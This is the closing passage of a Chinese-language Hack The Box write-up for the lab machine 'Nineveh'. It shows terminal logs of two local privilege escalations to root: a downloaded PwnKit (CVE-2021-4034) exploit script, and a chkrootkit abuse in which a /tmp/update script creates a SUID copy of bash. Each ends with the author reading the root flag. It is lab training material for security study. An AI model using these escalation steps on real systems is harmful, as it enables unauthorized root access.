<span class="hljs-number">3262</span> (<span class="hljs-number">3.2</span>K) [text/x-python]<br>Saving to: ‘CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py’<br><br>CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py    <span class="hljs-number">100</span>%[===================&gt;]   <span class="hljs-number">3.19</span>K  --.-KB/s    in <span class="hljs-number">0.03</span>s   <br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-27</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">24</span> (<span class="hljs-number">105</span> KB/s) - ‘CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py’ saved [<span class="hljs-number">3262</span>/<span class="hljs-number">3262</span>]<br><br>amrois@nineveh:~$ ls -la<br>total <span class="hljs-number">36</span><br>drwxr-xr-x <span class="hljs-number">4</span> amrois amrois <span class="hljs-number">4096</span> May <span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root   root      <span class="hljs-number">9</span> Dec <span class="hljs-number">17</span>  <span class="hljs-number">2020</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois  <span class="hljs-number">220</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois <span class="hljs-number">3765</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> amrois amrois <span class="hljs-number">4096</span> Jul  <span class="hljs-number">3</span>  <span class="hljs-number">2017</span> .cache<br>-rw-rw-r-- <span class="hljs-number">1</span> amrois amrois <span class="hljs-number">3262</span> May <span class="hljs-number">27</span>  <span class="hljs-number">2024</span> CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois  <span class="hljs-number">655</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .profile<br>drwxr-xr-x <span class="hljs-number">2</span> amrois amrois <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .ssh<br>-rw------- <span class="hljs-number">1</span> amrois amrois   <span class="hljs-number">33</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> user.txt<br>amrois@nineveh:~$ chmod +x CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py<br>amrois@nineveh:~$ python3 ./CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py<br>[+] Creating shared library <span class="hljs-keyword">for</span> exploit code.<br>[+] Calling execve()<br><span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1000</span>(amrois) groups=<span class="hljs-number">1000</span>(amrois)<br><span class="hljs-meta"># cat /root/root.txt</span><br>a0bf015e98ee7483a9a841a9cd16fc9c<br># <br></code></pre></td></tr></table></figure>
+
+<p>17、另一个权限提升：Root——Chrookit 漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit chkrootkit       <br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Chkrootkit - Local Privilege <span class="hljs-title function_">Escalation</span> <span class="hljs-params">(Metasploit)</span>                                                                                                  | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                                                                                                          | linux/local/33899.txt<br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br><br><br><br>创建脚本来设置 SUID 位/bin/bash<br><br> amrois@nineveh:~$ nano /tmp/update<br>		<br> cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash<br><br> amrois@nineveh:~$ chmod +x /tmp/update<br><br><br><br>amrois@nineveh:~$ <br>amrois@nineveh:~$ echo <span class="hljs-string">&quot;/bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash&quot;</span> &gt;  /tmp/update <br>amrois@nineveh:~$ <br>amrois@nineveh:~$ chmod +x /tmp/update<br>amrois@nineveh:~$ ls -la /bin/bash<br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">1037528</span> Jun <span class="hljs-number">24</span>  <span class="hljs-number">2016</span> /bin/bash<br>amrois@nineveh:~$ <br><br><br>amrois@nineveh:~$ cat /tmp/update<br>cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash<br>amrois@nineveh:~$ ls -la /tmp/rootbash<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">1037528</span> May <span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> /tmp/rootbash<br>amrois@nineveh:~$ /tmp/rootbash -p<br>rootbash<span class="hljs-number">-4.3</span><span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">1000</span>(amrois) gid=<span class="hljs-number">1000</span>(amrois) euid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">1000</span>(amrois)<br>rootbash<span class="hljs-number">-4.3</span><span class="hljs-meta"># cat /root/root.txt</span><br>a0bf015e98ee7483a9a841a9cd16fc9c<br>rootbash<span class="hljs-number">-4.3</span># <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/54</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nineveh-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/27/Nineveh-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/28/Sniper-htb-writeup/" title="Sniper-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Sniper-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/26/Mentor-htb-writeup/" title="Mentor-htb-writeup">
+                        <span class="hidden-mobile">Mentor-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
